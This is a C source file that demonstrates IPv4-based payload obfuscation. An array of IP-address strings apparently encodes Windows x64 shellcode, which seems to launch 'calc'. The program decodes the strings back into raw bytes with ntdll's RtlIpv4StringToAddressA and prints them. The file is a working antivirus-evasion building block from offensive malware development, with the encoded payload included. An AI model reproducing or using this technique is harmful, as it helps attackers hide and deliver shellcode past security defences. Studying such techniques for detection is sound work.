/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Base ipv4 deobfuscation
 */

#include <stdio.h>
#include <windows.h>

#define NumberOfElements 68

char* Ipv4Array[] = {
		"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82",
		"32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237",
		"82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
		"139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193",
		"56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73",
		"1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
		"89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",
		"111.135.255.213", "187.224.29.42", "10.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71",
		"19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.0"
};

/**
 * Function declaration.
 */
typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR       S,
    BOOLEAN     Strict,
    PCSTR*      Terminator,
    PVOID       Addr
);

/**
 * Deobfuscating payload.
 */
BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
    PBYTE           pBuffer                 = NULL, 
                    TmpBuffer               = NULL;
    SIZE_T          sBuffSize               = NULL;
    PCSTR           Terminator              = NULL;
    NTSTATUS        STATUS                  = NULL;

    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlIpv4StringToAddressA");
    if(pRtlIpv4StringToAddressA == NULL){
        return FALSE;
    }

    sBuffSize = NmbrOfElements * 4;

    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL){
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    TmpBuffer = pBuffer;

    for (int i = 0; i < NmbrOfElements; i++) {
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
            return FALSE;
        }

        TmpBuffer = (PBYTE)(TmpBuffer + 4);
    }

    *ppDAddress     = pBuffer;
    *pDSize         = sBuffSize;

    return TRUE;
}

int main() {

	PBYTE	pDAddress	= NULL;
	SIZE_T	sDSize		= NULL;

	if (!Ipv4Deobfuscation(Ipv4Array, NumberOfElements, &pDAddress, &sDSize)){
		return -1;
	}

	printf("[+] Deobfuscated Bytes at 0x%p of Size %ld ::: \n", pDAddress, sDSize);
	for (size_t i = 0; i < sDSize; i++){
		if (i % 16 == 0)
			printf("\n\t");

		printf("%0.2X ", pDAddress[i]);
	}

	HeapFree(GetProcessHeap(), 0, pDAddress);

	printf("\n\n[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}